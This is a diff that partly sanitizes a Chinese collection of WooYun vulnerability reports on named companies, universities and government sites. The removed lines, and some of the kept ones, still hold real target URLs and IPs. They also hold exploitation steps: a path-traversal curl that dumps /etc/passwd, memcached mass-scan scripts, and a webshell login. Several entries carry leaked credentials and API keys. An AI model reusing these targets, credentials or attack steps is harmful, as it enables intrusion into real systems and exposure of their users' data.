-**详情**: http://jz.1688.com/  可以自助建站13691281033047.gw.1688.com  === 13691281033047.gw.china.alibaba.com很多地方 比如旺旺聊天,淘宝商品详情页面 alibaba.com域名都是在白名单里, 利用自助建站工具可以建立虚假信息 宣传 之类的
+**详情**: https://example.com/[已脱敏]  可以自助建站13691281033047.gw.1688.com  === 13691281033047.gw.china.alibaba.com很多地方 比如旺旺聊天,某电商平台商品详情页面 alibaba.com域名都是在白名单里, 利用自助建站工具可以建立虚假信息 宣传 之类的
 
-**POC**: ;; ANSWER SECTION:gw.china.alibaba.com.	600	IN	A	110.173.196.3;; QUESTION SECTION:;gw.1688.com.			IN	A;; ANSWER SECTION:gw.1688.com.		600	IN	A	110.173.196.3
+**POC**: ;; ANSWER SECTION:gw.china.alibaba.com.	600	IN	A	[IP已脱敏];; QUESTION SECTION:;gw.1688.com.			IN	A;; ANSWER SECTION:gw.1688.com.		600	IN	A	[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -19500,7 +19500,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://github.com/doublesw/kuwoJumpServer证明是你们的发现一个IP扫描端口
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 8000端口弱口令  admin8002端口遍历，很多敏感信息轻松整理出内部员工用户名+serverIP简单看下临近IP
 
@@ -19510,8 +19510,8 @@
 ---
 
 ---
-### [wooyun-2011-03596] 腾讯一堆问题
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 应用配置错误
+### [wooyun-2011-03596] 某互联网公司一堆问题
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -19524,7 +19524,7 @@
 
 **详情**: 
 
-**POC**: http://login.7.qq.com/cgi-bin/CommWebGame/RealNameRegApp.cgi?rd=http://admin.dnfcity.qq.com:8080/admin/adminMain.dohttp://ava.qq.com/act/a20090706team/admin.htmhttp://admin.zhibo.qq.com/http://imgcache.qq.com/qzone/admin/user_PreviewInfo.html#http://imgcache.qq.com/qzone/admin/msg_editor.html?para='
+**POC**: https://example.com/[已脱敏]'
 
 **绕过**: 直接利用
 
@@ -19544,7 +19544,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先我在网上逛了逛看到了http://www.pzhdqedu.gov.cn/xx/x04/index.html然后我看了看后台，恩迅时的，迅时的漏洞老掉牙了，这里就不提了，拿到以后看了下密码admin510422pzh看起来还蛮难得，可是后台启用了cookie验证，呵呵上传了下菜刀连接。连接以后，我和我的小伙伴们都惊呆了我还能说什么呢
+**详情**: 首先我在网上逛了逛看到了https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -19566,9 +19566,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.抓乌云厂商域名,抓后使用grep awk把域名提取出来,excel分列功能也可以，略过#!/bin/bashfor ((i=1;i<24;i++))docurl http://www.wooyun.org/corps/page/$i|grep nofollow >> wooyun.txtdone2.域名解析为IP地址，获取厂商所在的IP段。#!/bin/bashwhile read onelinedodig ${oneline}|grep IN|grep A|tail -n 1|awk '{printf $5"\n"}' >> ip.txtdone < wooyun.org.txt3.批量扫描开放11211的端口的IP#!/bin/bashwhile read onelinedonmap -sT -p 11211 ${oneline}/24 >> 11211.txtdone < ip.
+**详情**: 1.抓乌云厂商域名,抓后使用grep awk把域名提取出来,excel分列功能也可以，略过#!/bin/bashfor ((i=1;i<24;i++))docurl https://example.com/[已脱敏] nofollow >> wooyun.txtdone2.域名解析为IP地址，获取厂商所在的IP段。#!/bin/bashwhile read onelinedodig ${oneline}|grep IN|grep A|tail -n 1|awk '{printf $5"\n"}' >> ip.txtdone < wooyun.org.txt3.批量扫描开放11211的端口的IP#!/bin/bashwhile read onelinedonmap -sT -p 11211 ${oneline}/24 >> 11211.txtdone < ip.
 
-**POC**: 筛选了一些结果如下：宜搜 118.145.13.3http://moto.it168.com/,,Interesting ports on 219.148.35.195:,11211/tcp open,,Interesting ports on 219.148.35.196:,11211/tcp openopera.com,,Interesting ports on s-02-08.opera.com (195.189.143.156):,11211/tcp open,,Interesting ports on 195.189.143.157:,11211/tcp open,,Interest
+**POC**: 筛选了一些结果如下：宜搜 [IP已脱敏]https://example.com/[已脱敏] ports on [IP已脱敏]:,11211/tcp open,,Interesting ports on [IP已脱敏]:,11211/tcp openopera.com,,Interesting ports on s-02-08.opera.com ([IP已脱敏]):,11211/tcp open,,Interesting ports on [IP已脱敏]:,11211/tcp open,,Interest
 
 **绕过**: 直接利用
 
@@ -19588,7 +19588,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.直接访问 http://nic.czu.cn/KS_Data/KesionCMS7.mdb ,即可下载数据库。2.查看表“KS_Admin”可知管理员账户及密码，密码经过MD5加密，并不能直接知道明文密码。3.但是从表“KS_Log”可以看到以前登录错误（可能不是由于密码错误引起的）的日志，其中会将登录所输入的用户名及密码（明文）记录下来。将取得明文密码MD5加密后与表“KS_Admin”进行比对，可知正确的管理员账户和密码。4.同时后台登录的认证码为默认的“8888”。5.多个子站存在此漏洞！
+**详情**: 1.直接访问 https://example.com/[已脱敏] ,即可下载数据库。2.查看表“KS_Admin”可知管理员账户及密码，密码经过MD5加密，并不能直接知道明文密码。3.但是从表“KS_Log”可以看到以前登录错误（可能不是由于密码错误引起的）的日志，其中会将登录所输入的用户名及密码（明文）记录下来。将取得明文密码MD5加密后与表“KS_Admin”进行比对，可知正确的管理员账户和密码。4.同时后台登录的认证码为默认的“8888”。5.多个子站存在此漏洞！
 
 **POC**: 超级管理员登录成功（良心白帽，未做任何破坏）
 
@@ -19598,8 +19598,8 @@
 ---
 
 ---
-### [wooyun-2012-09187] 腾讯某分站短文件名泄露或可导致敏感文件泄露
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-09187] 某互联网公司某分站短文件名泄露或可导致敏感文件泄露
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -19610,7 +19610,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞介绍http://www.exploit-db.com/exploits/19525/利用这里给出的poc进行测试，遍历了该分站文件的短文件名，虽然不能精确获得文件全名，但是可根据短文件名给出的前几位字符推测后面内容，也可以针对性的做一个字典跑出文件全名
+**详情**: 漏洞介绍https://example.com/[已脱敏]
 
 **POC**: 可以看到文件都是存在的，这里拿几个可以通过站内链接访问到的文件对比
 
@@ -19676,9 +19676,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: about后面的文件不解析，直接下载http://www.xywy.com/about/admin.phphttp://www.xywy.com/about/include/config.inc.php配置文件还好不可以外联，不然～～
+**详情**: about后面的文件不解析，直接下载https://example.com/[已脱敏]
 
-**POC**: <?php//ÆÁ±Î´íÎóÐÅÏ¢ini_set("display_errors","off");error_reporting(0);//Êý¾Ý¿â²ÎÊý$db_host='121.101.220.3';$db_usr = 'cms_admin';$db_pwd='1qaz2wsx';$db_name = 'cms_usr';define("__ROOT__",dirname("__FILE__"));require_once(__ROOT__.'/class/adodb/adodb.inc.php');$conn=&NEWADOConnection("mysql");$conn->
+**POC**: <?php//ÆÁ±Î´íÎóÐÅÏ¢ini_set("display_errors","off");error_reporting(0);//Êý¾Ý¿â²ÎÊý$db_host='[IP已脱敏]';$db_usr = 'cms_admin';$db_pwd='1qaz2wsx';$db_name = 'cms_usr';define("__ROOT__",dirname("__FILE__"));require_once(__ROOT__.'/class/adodb/adodb.inc.php');$conn=&NEWADOConnection("mysql");$conn->
 
 **绕过**: 直接利用
 
@@ -19687,7 +19687,7 @@
 
 ---
 ### [wooyun-2015-099120] 电信某站DNS域传送漏洞
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -19704,7 +19704,7 @@
 
 **绕过**: 直接利用
 
-**修复**: 详见：http://drops.wooyun.org/papers/64。
+**修复**: 详见：https://example.com/[已脱敏]
 ---
 
 ---
@@ -19720,7 +19720,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 登陆界面：http://passport.blogbus.com/login_form?goto=http%3A%2F%2Fpassport.blogbus.com%2Fusers%2F无验证码，无错误次数限制...导致可暴力破解。，目标：sonybook 登录时抓包：破解：
+**详情**: 登陆界面：https://example.com/[已脱敏] 登录时抓包：破解：
 
 **POC**: (见原文)
 
@@ -19752,8 +19752,8 @@
 ---
 
 ---
-### [wooyun-2012-05441] QQ返利合作网站账号无法登录
-**厂商**: 京东商城 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-05441] 某互联网公司返利合作网站账号无法登录
+**厂商**: 某电商平台商城 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -19786,7 +19786,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://kf.yy.com/admin/
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -19808,7 +19808,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://gitlab.baozou.com/explore/projects/starred
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -19818,8 +19818,8 @@
 ---
 
 ---
-### [wooyun-2012-09316] 百度某站nginx解析漏洞
-**厂商**: 百度 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-09316] 某搜索引擎某站nginx解析漏洞
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 上传功能
 
@@ -19832,7 +19832,7 @@
 
 **详情**: 由于没有上传点 故漏洞等级低
 
-**POC**: http://youa.baidu.com/robots.txt/数据流.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -19854,7 +19854,7 @@
 
 **详情**: 想要礼物  ！  麻烦管理 说一声！  谢谢咯！
 
-**POC**: http://www.zzzydj.gov.cn/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -19876,7 +19876,7 @@
 
 **详情**: 万网CDN域传送漏洞，源IP泄露？
 
-**POC**: > [ns1.hichinacdn.com]hichinacdn.com.                NS     server = ns1.hichinacdn.comhichinacdn.com.                NS     server = ns2.hichinacdn.combbs.51game.asia                A      220.175.122.66fswd4.51game.asia              A      220.175.122.69qipaile.51game.asia            A      220.17
+**POC**: > [ns1.hichinacdn.com]hichinacdn.com.                NS     server = ns1.hichinacdn.comhichinacdn.com.                NS     server = ns2.hichinacdn.combbs.51game.asia                A      [IP已脱敏]fswd4.51game.asia              A      [IP已脱敏]qipaile.51game.asia            A      220.17
 
 **绕过**: 直接利用
 
@@ -19906,8 +19906,8 @@
 ---
 
 ---
-### [wooyun-2013-027891] 京东某应用服务器各种漏点
-**厂商**: 京东商城 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
+### [wooyun-2013-027891] 某电商平台某应用服务器各种漏点
+**厂商**: 某电商平台商城 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -19918,9 +19918,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 看到有人发了个老外的大学有solr泄漏信息的问题，把京东的一个也发上来，京东就2个段，机器也不多，找漏洞实在不是很多。http://58.83.206.138/wordtype/admin/
+**详情**: 看到有人发了个老外的大学有solr泄漏信息的问题，把某电商平台的一个也发上来，某电商平台就2个段，机器也不多，找漏洞实在不是很多。http://[IP已脱敏]
 
-**POC**: http://58.83.206.138/wordtype/admin/
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -19940,9 +19940,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: # 概述在测试过程中，发现上交所的主站与静态页面采取了负载均衡切割的架构，静态文件通过http://static.sse.com.cn这个域名来访问，而与服务器交互的动态脚本采用各业务系统的二级域，或主站的www.sse.com.cn来解析。static的配置，并不解析JSP脚本，而中间件的WEB目录却指向了真是的生产源码路径。所以，间接导致了，通过http://static.sse.com.cn/WEB-INF/web.xml 这个中间件的入口，就可以读取整个www.sse.com.cn业务线的所有脚本文件源码。# 利用1 -- 业务平台上市公司登陆接口的验证码生成文件http://biz.sse.com.cn/sseportal/cs/zhs/yzm/CreadGeneratedCode.jsp读登录接口验证码生成器的源码，间接暴力破解http://static.sse.com.cn/
+**详情**: # 概述在测试过程中，发现上交所的主站与静态页面采取了负载均衡切割的架构，静态文件通过https://example.com/[已脱敏] 这个中间件的入口，就可以读取整个www.sse.com.cn业务线的所有脚本文件源码。# 利用1 -- 业务平台上市公司登陆接口的验证码生成文件https://example.com/[已脱敏]
 
-**POC**: # EDU 二级域名频道http://edu.sse.com.cn/sseportal/newedu/jsp/c200401_p1979.jsp?INCLUEPAGE=/newedu/static/7771.jsphttp://static.sse.com.cn/sseportal/newedu/jsp/c200401_p1979.jsphttp://static.sse.com.cn/sseportal//newedu/static/7771.jsp# bond.sse.com.cn 二级域名也可以，自由发挥。# 5万多个文件，等你来读！
+**POC**: # EDU 二级域名频道https://example.com/[已脱敏] bond.sse.com.cn 二级域名也可以，自由发挥。# 5万多个文件，等你来读！
 
 **绕过**: 直接利用
 
@@ -19962,9 +19962,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞存在一个接口处http://exam.sunlands.com/portal-war-exam/pt_ea/orderConfirm/viewOrderConfirmPage.action?editFlag=Y&actionFlag=showExamUserInfo&period=201509&orderId=49613看到了把准考证和密码，个人信息全部泄漏了~~~~分析下orderId=49613未加密，直接+1逻辑，查询下一位估计上万数据~~汗http://exam.sunlands.com/portal-war-exam/pt_ea/orderConfirm/viewOrderConfirmPage.action?editFlag=Y&actionFlag=showExamUserInfo&period=201509&orderId=49614http://exam.sunlan
+**详情**: 漏洞存在一个接口处https://example.com/[已脱敏]
 
-**POC**: http://exam.sunlands.com/portal-war-exam/pt_ea/orderConfirm/viewOrderConfirmPage.action?editFlag=Y&actionFlag=showExamUserInfo&period=201509&orderId=49613随意查询用户上万信息
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -19984,9 +19984,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.591提供租屋、中古屋、新房屋、建案、店面頂讓、搬家、 設計、 居家/家具資訊:http://www.591.com.tw2.首页：3.泄露域名指向：; <<>> DiG 9.8.3-P1 <<>> @ns1.addcn.com.tw. axfr 591.com.tw; (1 server found);; global options: +cmd591.com.tw.		90	IN	SOA	ns2.addcn.com.tw. ronman.8591.com.tw. 2015020406 10800 3600 604800 86400591.com.tw.		90	IN	NS	ns1.518.com.tw.591.com.tw.		90	IN	NS	ns1.addcn.com.tw.591.com.tw.		90	IN	NS	ns2.addcn.com.tw.591.com.tw.		
+**详情**: 1.591提供租屋、中古屋、新房屋、建案、店面頂讓、搬家、 設計、 居家/家具資訊:https://example.com/[已脱敏] <<>> DiG 9.8.3-P1 <<>> @ns1.addcn.com.tw. axfr 591.com.tw; (1 server found);; global options: +cmd591.com.tw.		90	IN	SOA	ns2.addcn.com.tw. ronman.8591.com.tw. 2015020406 10800 3600 604800 86400591.com.tw.		90	IN	NS	ns1.518.com.tw.591.com.tw.		90	IN	NS	ns1.addcn.com.tw.591.com.tw.		90	IN	NS	ns2.addcn.com.tw.591.com.tw.		
 
-**POC**: 1.591提供租屋、中古屋、新房屋、建案、店面頂讓、搬家、 設計、 居家/家具資訊:http://www.591.com.tw2.首页：3.泄露域名指向：; <<>> DiG 9.8.3-P1 <<>> @ns1.addcn.com.tw. axfr 591.com.tw; (1 server found);; global options: +cmd591.com.tw.		90	IN	SOA	ns2.addcn.com.tw. ronman.8591.com.tw. 2015020406 10800 3600 604800 86400591.com.tw.		90	IN	NS	ns1.51
+**POC**: 1.591提供租屋、中古屋、新房屋、建案、店面頂讓、搬家、 設計、 居家/家具資訊:https://example.com/[已脱敏] <<>> DiG 9.8.3-P1 <<>> @ns1.addcn.com.tw. axfr 591.com.tw; (1 server found);; global options: +cmd591.com.tw.		90	IN	SOA	ns2.addcn.com.tw. ronman.8591.com.tw. 2015020406 10800 3600 604800 86400591.com.tw.		90	IN	NS	ns1.51
 
 **绕过**: 直接利用
 
@@ -20006,9 +20006,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.sy-yy.com/admin/login.aspx首页
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://www.sy-yy.com/admin/login.aspx首页加个admin就不得了！！！http://www.sy-yy.com/admin/Homepage.aspx
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -20050,7 +20050,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1,http://112.90.224.187/backup/configs.7z  这是配置文件,里面有数据库配置$config['db'] = array('library' => 'database','type' => 'mysql','host' => isset($_SERVER['db_host']) ? $_SERVER['db_host'] : '127.0.0.1','name' => isset($_SERVER['db_name']) ? $_SERVER['db_name'] : 'shouhuzhemen_gm','user' => isset($_SERVER['db_user']) ? $_SERVER['db_user'] : 'root','password' => isset($_SERVER['db_password']) ? $_SERVER['d
+**详情**: 1,http://[IP已脱敏]  这是配置文件,里面有数据库配置$config['db'] = array('library' => 'database','type' => 'mysql','host' => isset($_SERVER['db_host']) ? $_SERVER['db_host'] : '[IP已脱敏]','name' => isset($_SERVER['db_name']) ? $_SERVER['db_name'] : 'shouhuzhemen_gm','user' => isset($_SERVER['db_user']) ? $_SERVER['db_user'] : 'root','password' => isset($_SERVER['db_password']) ? $_SERVER['d
 
 **POC**: 如上
 
@@ -20074,7 +20074,7 @@
 
 **详情**: 登陆页面:获取数据截图：登进结果：
 
-**POC**: 以为有用户在线所以没强进，UserName=1000001199Password=241213登陆页面地址：https://vpn.ujs.edu.cn
+**POC**: 以为有用户在线所以没强进，UserName=1000001199Password=241213登陆页面地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -20094,7 +20094,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 东北证券源码泄漏  还是热的 http://www.nesc.cn/db.zip
+**详情**: 东北证券源码泄漏  还是热的 https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -20116,7 +20116,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: ns1.nandu.com DNS 服务器配置不当，导致所有域名dns泄露，可能引起进一步的入侵。[ns1.nandu.com]nandu.com.                     SOA    ns1.nandu.com root.nandu.com. (2009041701 3600 900 68400 15)nandu.com.                     NS     ns1.nandu.comnandu.com.                     NS     ns2.nandu.comnandu.com.                     A      113.108.213.9nandu.com.                     MX     5    mail.nandu.comnandu.com.                  
+**详情**: ns1.nandu.com DNS 服务器配置不当，导致所有域名dns泄露，可能引起进一步的入侵。[ns1.nandu.com]nandu.com.                     SOA    ns1.nandu.com root.nandu.com. (2009041701 3600 900 68400 15)nandu.com.                     NS     ns1.nandu.comnandu.com.                     NS     ns2.nandu.comnandu.com.                     A      [IP已脱敏]nandu.com.                     MX     5    mail.nandu.comnandu.com.                  
 
 **POC**: >nslookup>server ns1.nandu.com>ls -d nandu.com
 
@@ -20140,7 +20140,7 @@
 
 **详情**: 方正证券不用多介绍了吧，玩股票的都知道。
 
-**POC**: 商城：http://shop.foundersc.com/就是让你买东西的各种内部投资方案，都是4位数的价格。。。那么怎么不花一分钱享用这些价值不菲的东西呢很简单：http://120.199.3.254/wzfile/attach/存在目录遍历漏洞所有的商城产品都在里面了比如看到量化金股（成长性）找到对应的目录，每一期都在这里了其他产品一样好好修复吧
+**POC**: 商城：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -20160,7 +20160,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 站点：https://cloudcontrol.chinacache.com/获取登录的用户密码信息进入会员中心，系统密码明文显示
+**详情**: 站点：https://example.com/[已脱敏]
 
 **POC**: 控制服务器
 
@@ -20182,7 +20182,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 网站登陆地址http://www.gpsoo.net/user/test123456最初发现是手机端登陆手机端登陆车辆管理车辆报警信息查看车辆断开油路控制和其他指令控制
+**详情**: 网站登陆地址https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -20204,7 +20204,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 事情在出现在群里，有人发出来了黑页。既然有人拿了，当然有痕迹，何况啥菜鸟站点。御剑一扫发现test.txt发现这个，大概大家都想到了PUT写入漏洞，桂林老兵写入的默认请求文件，当然，看到页面暴露的一句话，我确认了。但是PUT又没打开，于是看见了扫出来的xiao.asp打开是空白的，不说了，一句话，http://fjfa110.gov.cn/xiao.asp密码：xiao直接菜刀连接。
+**详情**: 事情在出现在群里，有人发出来了黑页。既然有人拿了，当然有痕迹，何况啥菜鸟站点。御剑一扫发现test.txt发现这个，大概大家都想到了PUT写入漏洞，桂林老兵写入的默认请求文件，当然，看到页面暴露的一句话，我确认了。但是PUT又没打开，于是看见了扫出来的xiao.asp打开是空白的，不说了，一句话，https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -20226,9 +20226,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: [root@localhost ~]# curl http://feed.36kr.com/../../../../../../../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/va
+**详情**: [root@localhost ~]# curl https://example.com/[已脱敏]
 
-**POC**: [root@localhost ~]# curl http://feed.36kr.com/../../../../../../../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/
+**POC**: [root@localhost ~]# curl https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -20248,13 +20248,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 58.83.197.29 MongoDB 配置不当
+**详情**: [IP已脱敏] MongoDB 配置不当
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 启用 auth 指定 IP访问请参照 http://www.oschina.net/translate/10-tips-improve-mongodb
+**修复**: 启用 auth 指定 IP访问请参照 https://example.com/[已脱敏]
 ---
 
 ---
@@ -20280,8 +20280,8 @@
 ---
 
 ---
-### [wooyun-2012-09781] 百度某站解析漏洞
-**厂商**: 百度 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-09781] 某搜索引擎某站解析漏洞
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -20292,7 +20292,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: nginx配置不到造成任意文件当成php解析。相关链接：http://jingyan.baidu.com/event/img/07165.jpg/xxxxxxx1.php
+**详情**: nginx配置不到造成任意文件当成php解析。相关链接：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -20303,7 +20303,7 @@
 
 ---
 ### [wooyun-2014-078230] 南北软件通用漏洞威胁用户tomcat
-**厂商**: http://www.snsoft.com.cn/ | **年份**: 2014 | **类型**: 默认配置不当
+**厂商**: https://example.com/[已脱敏] | **年份**: 2014 | **类型**: 默认配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -20314,7 +20314,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 南北软件通用漏洞威胁用户url:http://121.17.35.196:8000/manager/htmluser:tomcatpass:tomcaturl:http://121.28.149.166:8000/manager/htmluser:tomcatpass:tomcaturl:http://121.28.148.43:8000/manager/htmluser:tomcatpass:tomcat还有很多我就不一一列举全部是一样的密码和端口   这样应该算通用漏洞吧   我就随便那一个来证明不然说我没图没真相
+**详情**: 南北软件通用漏洞威胁用户url:http://[IP已脱敏]   这样应该算通用漏洞吧   我就随便那一个来证明不然说我没图没真相
 
 **POC**: (见原文)
 
@@ -20380,9 +20380,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 打开网站 随手点了下国富咨询看了下链接 http://www.capitaledge.cn/Capitaledge/report_findAll.action然后请出了shack2的str2漏洞利用工具最高权限吧   邪恶了
+**详情**: 打开网站 随手点了下国富咨询看了下链接 https://example.com/[已脱敏]   邪恶了
 
-**POC**: 打开网站 随手点了下国富咨询看了下链接 http://www.capitaledge.cn/Capitaledge/report_findAll.action然后请出了shack2的str2漏洞利用工具最高权限吧   邪恶了
+**POC**: 打开网站 随手点了下国富咨询看了下链接 https://example.com/[已脱敏]   邪恶了
 
 **绕过**: 直接利用
 
@@ -20402,7 +20402,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 网站名称： 北京基调网络系统有限公司网站域名： networkbench.com主办单位名称： 北京基调网络系统有限公司很牛B的测速  呵。。DNS域传送漏洞     注意一下安全吧C:\Documents and Settings\Administrator>nslookupDefault Server:  google-public-dns-a.google.comAddress:  8.8.8.8> set type=ns> networkbench.comServer:  google-public-dns-a.google.comAddress:  8.8.8.8Non-authoritative answer:networkbench.com        nameserver = dns.uncnet.comnetworkbench.com        nameserver
+**详情**: 网站名称： 北京基调网络系统有限公司网站域名： networkbench.com主办单位名称： 北京基调网络系统有限公司很牛B的测速  呵。。DNS域传送漏洞     注意一下安全吧C:\Documents and Settings\Administrator>nslookupDefault Server:  google-public-dns-a.google.comAddress:  [IP已脱敏]> set type=ns> networkbench.comServer:  google-public-dns-a.google.comAddress:  [IP已脱敏]Non-authoritative answer:networkbench.com        nameserver = dns.uncnet.comnetworkbench.com        nameserver
 
 **POC**: 如上
 
@@ -20424,7 +20424,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: IIS写权限漏洞http://124.207.21.90http://124.207.21.90/logtest.txt
+**详情**: IIS写权限漏洞http://[IP已脱敏]http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -20446,13 +20446,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 58.254.169.26 MongoDB 配置不当
+**详情**: [IP已脱敏] MongoDB 配置不当
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 启用 auth 指定 IP访问请参照 http://www.oschina.net/translate/10-tips-improve-mongodb
+**修复**: 启用 auth 指定 IP访问请参照 https://example.com/[已脱敏]
 ---
 
 ---
@@ -20490,7 +20490,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://zc.xmgps.comGNSS网上查车系统http://zc.xmgps.com/Webgps/WebPost_Test.aspx打开测试页面，获取到账号查看源文件，获取到密码登录http://zc.xmgps.com/Login.aspx账号：gps_zzh密码：1234
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 删除测试账号网页，禁止目录遍历
 
@@ -20512,9 +20512,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 正常url:http://www.njzq.com.cn/njzq/xwzx/xwzq_template.jsp?docId=2399312访问畸形的url:cc
+**详情**: 正常url:https://example.com/[已脱敏]
 
-**POC**: http://www.njzq.com.cn/////njzq/xwzx/xwzq_template.jsp?docId=2399312
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -20534,7 +20534,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: IIS中可以PUT导致任意上传https://122.96.155.202/
+**详情**: IIS中可以PUT导致任意上传https://[IP已脱敏]
 
 **POC**: 各种财务表格就不看了
 
@@ -20544,8 +20544,8 @@
 ---
 
 ---
-### [wooyun-2016-0167755] 新浪乐居mail一枚
-**厂商**: 新浪乐居 | **年份**: 2016 | **类型**: 系统/服务运维配置不当
+### [wooyun-2016-0167755] 某社交平台乐居mail一枚
+**厂商**: 某社交平台乐居 | **年份**: 2016 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -20556,9 +20556,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://github.com/maqiong/admin_ext_git/blob/230f4595fb0fbeed126de4563fe75a097f906fa5/app/_function/functions.phphttps://github.com/maqiong/admin_ext_git/blob/230f4595fb0fbeed126de4563fe75a097f906fa5/app/_function/functions.php.bak
+**详情**: https://example.com/[已脱敏]
 
-**POC**: $sms_url = 'http://ems.leju.com/api/sms/send';$appid = '2014031325';$key = '8aed8828d5ec6de85dabd01def123659';if($type=='fnj'){$appid = '2014031324';$key = 'd233ea76d65c710f02c5253328f9700a';}
+**POC**: $sms_url = 'https://example.com/[已脱敏]';$appid = '2014031325';$key = '8aed8828d5ec6de85dabd01def123659';if($type=='fnj'){$appid = '2014031324';$key = 'd233ea76d65c710f02c5253328f9700a';}
 
 **绕过**: 直接利用
 
@@ -20578,7 +20578,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 180.153.224.229
+**详情**: [IP已脱敏]
 
 **POC**: (见原文)
 
@@ -20600,9 +20600,9 @@
 2. 构造测试Payload
